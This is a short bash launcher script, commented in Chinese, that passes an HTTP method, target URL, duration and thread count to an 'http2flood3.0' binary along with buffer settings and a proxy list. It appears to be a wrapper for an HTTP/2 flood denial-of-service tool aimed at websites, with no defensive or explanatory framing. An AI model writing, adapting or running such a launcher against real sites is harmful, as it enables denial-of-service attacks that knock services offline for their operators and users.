#!/bin/bash
# 用法: ./cc <方式> <地址> <时间> <线程>
# 对应:    $1      $2     $3     $4

# 检查参数是否齐全
if [ -z "$4" ]; then
    echo "用法: ./cc GET http://xxx.com 60 10"
    exit 1
fi

# 直接运行程序，把 $1-$4 传进去，后面跟上你的默认参数
./http2flood3.0 "$1" "$2" "$3" "$4" 64 65555 16384b 131072b proxy.txt
